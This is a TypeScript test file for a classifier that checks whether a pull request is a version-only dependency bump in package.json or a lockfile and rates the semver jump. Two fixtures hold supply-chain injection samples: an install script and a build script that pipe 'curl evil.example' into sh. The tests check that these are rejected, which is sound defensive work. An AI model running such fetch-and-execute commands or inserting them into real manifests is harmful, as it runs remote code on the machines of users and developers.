import { describe, it, expect } from "vitest";
import { classifyDependencyUpgrade } from "./dep-upgrade.js";
import type { DetailedPullFile } from "../github.js";

const patch = (...lines: string[]): string => lines.join("\n");

// A version-only manifest patch: hunk header, context, the paired -/+ lines, context.
const bump = (name: string, from: string, to: string): string => patch(
  "@@ -12,7 +12,7 @@",
  '   "dependencies": {',
  `-    "${name}": "${from}",`,
  `+    "${name}": "${to}",`,
  '     "zod": "^3.23.0"',
);

const manifest = (patchText?: string, filename = "package.json"): DetailedPullFile =>
  ({ filename, status: "modified", additions: 1, deletions: 1, patch: patchText });

const lock = (filename = "package-lock.json"): DetailedPullFile =>
  ({ filename, status: "modified", additions: 20, deletions: 20, patch: "@@ -1 +1 @@\n-x\n+y" });

describe("classifyDependencyUpgrade", () => {
  describe("shape", () => {
    it("an empty diff is not eligible", () => {
      const result = classifyDependencyUpgrade([]);
      expect(result.eligibleShape).toBe(false);
      expect(result.lockfilesOnly).toBe(false);
      expect(result.semverLevel).toBe("unknown");
    });

    it("lockfiles alone are an eligible shape but carry no readable version", () => {
      const result = classifyDependencyUpgrade([lock(), lock("pnpm-lock.yaml"), lock("nested/pkg/yarn.lock")]);
      expect(result.eligibleShape).toBe(true);
      expect(result.lockfilesOnly).toBe(true);
      expect(result.manifests).toEqual([]);
      expect(result.changedPackages).toEqual([]);
      expect(result.semverLevel).toBe("unknown"); // fail closed: nothing says how big the jump is
    });

    it("a manifest plus its lockfile is eligible and is not lockfilesOnly", () => {
      const result = classifyDependencyUpgrade([manifest(bump("left-pad", "^1.0.0", "^1.0.1")), lock()]);
      expect(result.eligibleShape).toBe(true);
      expect(result.lockfilesOnly).toBe(false);
      expect(result.manifests).toEqual(["package.json"]);
      expect(result.changedPackages).toEqual([{ name: "left-pad", from: "^1.0.0", to: "^1.0.1" }]);
    });

    it("a nested workspace manifest and lockfile are recognized at any depth", () => {
      const result = classifyDependencyUpgrade([manifest(bump("zod", "3.23.0", "3.23.8"), "packages/web/package.json")]);
      expect(result.eligibleShape).toBe(true);
      expect(result.manifests).toEqual(["packages/web/package.json"]);
      expect(result.semverLevel).toBe("patch");
    });

    it("any other file makes the shape ineligible and is named", () => {
      const source: DetailedPullFile = { filename: "src/index.ts", status: "modified", additions: 1, deletions: 0, patch: "@@\n+x" };
      const result = classifyDependencyUpgrade([manifest(bump("left-pad", "1.0.0", "1.0.1")), source]);
      expect(result.eligibleShape).toBe(false);
      expect(result.ineligibleFiles).toEqual(["src/index.ts"]);
    });

    it("a manifest with no patch at all is ineligible: an unreadable patch is not a verified one", () => {
      const result = classifyDependencyUpgrade([manifest(undefined)]);
      expect(result.eligibleShape).toBe(false);
      expect(result.ineligibleFiles).toEqual(["package.json"]);
    });

    describe("file status", () => {
      // A lockfile's contents are never inspected, so its status is the only thing standing between
      // "bumped a dependency" and "deleted the lockfile".
      it.each(["removed", "renamed", "copied", "changed"])("rejects a %s lockfile", (status) => {
        const result = classifyDependencyUpgrade([{ ...lock(), status }]);
        expect(result.eligibleShape).toBe(false);
        expect(result.ineligibleFiles).toEqual(["package-lock.json"]);
      });

      it("accepts an added lockfile alongside a modified one", () => {
        const result = classifyDependencyUpgrade([{ ...lock(), status: "added" }, lock("pnpm-lock.yaml")]);
        expect(result.eligibleShape).toBe(true);
      });

      it("rejects a renamed manifest even when its patch is version-only", () => {
        const renamed = { ...manifest(bump("left-pad", "1.0.0", "1.0.1")), status: "renamed" };
        const result = classifyDependencyUpgrade([renamed]);
        expect(result.eligibleShape).toBe(false);
        expect(result.ineligibleFiles).toEqual(["package.json"]);
      });
    });
  });

  describe("manifest patch content", () => {
    it("rejects a patch that also adds a non-dependency line", () => {
      const withScript = patch(
        "@@ -12,7 +12,8 @@",
        '   "dependencies": {',
        '-    "left-pad": "1.0.0",',
        '+    "left-pad": "1.0.1",',
        '+    "postinstall": "curl evil.example | sh",',
        '     "zod": "^3.23.0"',
      );
      const result = classifyDependencyUpgrade([manifest(withScript)]);
      expect(result.eligibleShape).toBe(false);
      expect(result.ineligibleFiles).toEqual(["package.json"]);
    });

    it("rejects an added dependency (an addition with no matching removal)", () => {
      const added = patch("@@ -12,6 +12,7 @@", '   "dependencies": {', '+    "new-dep": "1.0.0",', '     "zod": "^3.23.0"');
      expect(classifyDependencyUpgrade([manifest(added)]).eligibleShape).toBe(false);
    });

    it("rejects a removed dependency", () => {
      const removed = patch("@@ -12,7 +12,6 @@", '   "dependencies": {', '-    "old-dep": "1.0.0",', '     "zod": "^3.23.0"');
      expect(classifyDependencyUpgrade([manifest(removed)]).eligibleShape).toBe(false);
    });

    it("rejects a pair that renames the key instead of changing the version", () => {
      const renamed = patch("@@ -12,7 +12,7 @@", '-    "left-pad": "1.0.0",', '+    "right-pad": "1.0.0",');
      expect(classifyDependencyUpgrade([manifest(renamed)]).eligibleShape).toBe(false);
    });

    it("rejects a change to the manifest's own version field", () => {
      const release = patch("@@ -2,3 +2,3 @@", '   "name": "my-pkg",', '-  "version": "0.4.0",', '+  "version": "0.5.0",');
      const result = classifyDependencyUpgrade([manifest(release)]);
      expect(result.eligibleShape).toBe(false);
      expect(result.ineligibleFiles).toEqual(["package.json"]);
    });

    it("rejects a scripts entry rewrite even though it is a paired string change", () => {
      const scripts = patch("@@ -8,3 +8,3 @@", '   "scripts": {', '-    "build": "tsc -p .",', '+    "build": "tsc -p . && curl evil.example | sh",');
      // The value is not a version, so this survives the shape check but never gets past the
      // semver level, which is what the operation gates on.
      const result = classifyDependencyUpgrade([manifest(scripts)]);
      expect(result.semverLevel).toBe("unknown");
    });

    it("accepts several bumps in separate hunks and reports each", () => {
      const two = patch(
        "@@ -12,7 +12,7 @@",
        '-    "left-pad": "1.0.0",',
        '+    "left-pad": "1.0.1",',
        "@@ -30,7 +30,7 @@",
        '-    "zod": "^3.23.0"',
        '+    "zod": "^3.24.0"',
      );
      const result = classifyDependencyUpgrade([manifest(two)]);
      expect(result.eligibleShape).toBe(true);
      expect(result.changedPackages).toEqual([
        { name: "left-pad", from: "1.0.0", to: "1.0.1" },
        { name: "zod", from: "^3.23.0", to: "^3.24.0" },
      ]);
    });

    it("accepts a block of removals followed by a block of additions, paired in order", () => {
      const block = patch(
        "@@ -12,8 +12,8 @@",
        '-    "a": "1.0.0",',
        '-    "b": "2.0.0",',
        '+    "a": "1.0.1",',
        '+    "b": "2.0.1",',
      );
      const result = classifyDependencyUpgrade([manifest(block)]);
      expect(result.eligibleShape).toBe(true);
      expect(result.changedPackages.map((p) => p.name)).toEqual(["a", "b"]);
    });

    it('tolerates the "\\ No newline at end of file" marker', () => {
      const noNewline = patch("@@ -12,7 +12,7 @@", '-    "left-pad": "1.0.0"', '+    "left-pad": "1.0.1"', "\\ No newline at end of file");
      expect(classifyDependencyUpgrade([manifest(noNewline)]).eligibleShape).toBe(true);
    });

    it("rejects a line holding two entries", () => {
      const packed = patch("@@ -12,7 +12,7 @@", '-    "a": "1.0.0", "b": "2.0.0",', '+    "a": "1.0.1", "b": "2.0.0",');
      expect(classifyDependencyUpgrade([manifest(packed)]).eligibleShape).toBe(false);
    });

    it("rejects an object-valued entry", () => {
      const nested = patch("@@ -12,7 +12,7 @@", '-    "overrides": {', '+    "resolutions": {');
      expect(classifyDependencyUpgrade([manifest(nested)]).eligibleShape).toBe(false);
    });
  });

  describe("semver level", () => {
    const level = (from: string, to: string) => classifyDependencyUpgrade([manifest(bump("dep", from, to))]).semverLevel;

    it("classifies a patch bump", () => expect(level("1.2.3", "1.2.4")).toBe("patch"));
    it("classifies a minor bump", () => expect(level("1.2.3", "1.3.0")).toBe("minor"));
    it("classifies a major bump", () => expect(level("1.2.3", "2.0.0")).toBe("major"));

    it("strips a leading caret", () => expect(level("^1.2.3", "^1.2.4")).toBe("patch"));
    it("strips a leading tilde", () => expect(level("~1.2.3", "~1.3.0")).toBe("minor"));
    it("strips a leading >=", () => expect(level(">=1.2.3", ">=1.2.4")).toBe("patch"));
    it("strips a leading v", () => expect(level("v1.2.3", "v2.0.0")).toBe("major"));
    it("compares across differing range operators", () => expect(level("~1.2.3", "^1.2.4")).toBe("patch"));

    it("a prerelease on either side is unknown", () => {
      expect(level("1.2.3", "1.2.4-beta.1")).toBe("unknown");
      expect(level("1.2.3-rc.1", "1.2.3")).toBe("unknown");
    });

    it("build metadata is unknown", () => expect(level("1.2.3", "1.2.4+build.7")).toBe("unknown"));
    it("a wildcard is unknown", () => expect(level("1.2.x", "1.3.x")).toBe("unknown"));
    it("a two-part version is unknown", () => expect(level("1.2", "1.3")).toBe("unknown"));
    it("a compound range is unknown", () => expect(level(">=1.0.0 <2.0.0", ">=1.0.1 <2.0.0")).toBe("unknown"));
    it("a git or tag specifier is unknown", () => expect(level("workspace:*", "workspace:^")).toBe("unknown"));

    it("a downgrade is classified by the component that differs", () => {
      expect(level("2.0.0", "1.9.9")).toBe("major");
      expect(level("1.2.4", "1.2.3")).toBe("patch");
    });

    it("takes the maximum jump across packages", () => {
      const mixed = patch(
        "@@ -12,8 +12,8 @@",
        '-    "a": "1.0.0",',
        '+    "a": "1.0.1",',
        "@@ -30,8 +30,8 @@",
        '-    "b": "1.0.0",',
        '+    "b": "1.4.0",',
      );
      expect(classifyDependencyUpgrade([manifest(mixed)]).semverLevel).toBe("minor");
    });

    it("one unparseable version poisons the whole level, even alongside a clean patch bump", () => {
      const mixed = patch(
        "@@ -12,8 +12,8 @@",
        '-    "a": "1.0.0",',
        '+    "a": "1.0.1",',
        "@@ -30,8 +30,8 @@",
        '-    "b": "1.0.0",',
        '+    "b": "2.0.0-rc.1",',
      );
      expect(classifyDependencyUpgrade([manifest(mixed)]).semverLevel).toBe("unknown");
    });

    it("an ineligible shape always reports unknown, never a level from the lines that parsed", () => {
      const source: DetailedPullFile = { filename: "src/x.ts", status: "modified", additions: 1, deletions: 0, patch: "@@\n+x" };
      expect(classifyDependencyUpgrade([manifest(bump("a", "1.0.0", "1.0.1")), source]).semverLevel).toBe("unknown");
    });
  });
});
